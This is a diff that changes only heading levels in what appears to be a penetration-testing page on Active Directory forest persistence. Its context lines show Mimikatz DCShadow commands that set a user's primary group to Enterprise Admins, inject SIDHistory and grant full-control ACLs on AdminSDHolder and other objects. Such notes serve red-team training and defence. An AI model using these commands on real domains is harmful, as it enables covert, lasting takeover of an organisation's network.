@@ -4,7 +4,7 @@ title: Forest Persistence
 
 We are going to discuss some ways to do a persistence in a forest root.
 
-# DCShadow
+## DCShadow
 
 DCShadow temporaly registers a new DC in the target domain and uses it to push attributes like `SID History`, `SPNs` and more over on the specified object without leaving the cange logs for modified object.
 
@@ -35,7 +35,7 @@ lsadump::dcshadow /push
 >
 > `Set-DCShadowPermissions -FakeDC machine-user01 -SAMAccountName root1user -Username user01 -Verbose`
 
-## Set Primary Group ID to Enterprise Admin
+### Set Primary Group ID to Enterprise Admin
 
 Now that we have been discovered how to overwrite attributes of users, we can change the group id of a user to the id of the enterprise administrators or domain admins.
 
@@ -44,7 +44,7 @@ lsadump::dcshadow /object:user01 /attribute:primaryGroupID /value:519
 ```
 > **Note**: This makes noise, because every one who looks `net group "Enterpise Admins" /domain` will see that the user user01 is a member.
 
-## Change SIDHistory of a user
+### Change SIDHistory of a user
 
 We can modify the SIDHistory of a user with SID of `Enterprise Admins` group in order to obtain full control of the forest.
 
@@ -53,7 +53,7 @@ lsadump::dcshadow /object:user /attribute:SIDHistory /value:S-1-5-21-280534878-1
 ```
 
 
-## Modify ntSecurityDescriptor for AdminSDHolder
+### Modify ntSecurityDescriptor for AdminSDHolder
 
 We can modify the `ntSecurityDescriptor` for AdminSDHolder to add full control for a user.
 
@@ -75,7 +75,7 @@ ORIGINAL ACL + FULL CONTROL FOR OUR USER
 >
 > `Get-NetUser user01`
 
-## Shadowception
+### Shadowception
 
 We can even run DCShadow from DCShadow. To do that task we will add the following ACLs:
 
@@ -84,7 +84,7 @@ We can even run DCShadow from DCShadow. To do that task we will add the followin
 ```
 > **Note** We can use `/stack` to stack multiple ACL.
 
-### Domain Object
+#### Domain Object
 
 * List ACL:
 ```powershell
@@ -101,7 +101,7 @@ We can even run DCShadow from DCShadow. To do that task we will add the followin
 lsadump::dcshadow /stack /object:DC=corp,DC=local /attribute:ntSecurityDescriptor /value:<MODIFIED ACL>
 ```
 
-### Attacker Computer Object
+#### Attacker Computer Object
 
 * List ACL:
 ```powershell
@@ -116,7 +116,7 @@ lsadump::dcshadow /stack /object:DC=corp,DC=local /attribute:ntSecurityDescripto
 lsadump::dcshadow /stack /object:machine01$ /attribute:ntSecurityDescriptor /value:<MODIFIED ACL>
 ```
 
-### Target User Object
+#### Target User Object
 
 * List ACL:
 ```powershell
@@ -131,7 +131,7 @@ lsadump::dcshadow /stack /object:machine01$ /attribute:ntSecurityDescriptor /val
 lsadump::dcshadow /stack /object:targetuser01 /attribute:ntSecurityDescriptor /value:<MODIFIED ACL>
 ```
 
-### Sites Configuration Object
+#### Sites Configuration Object
 
 * List ACL:
 ```powershell
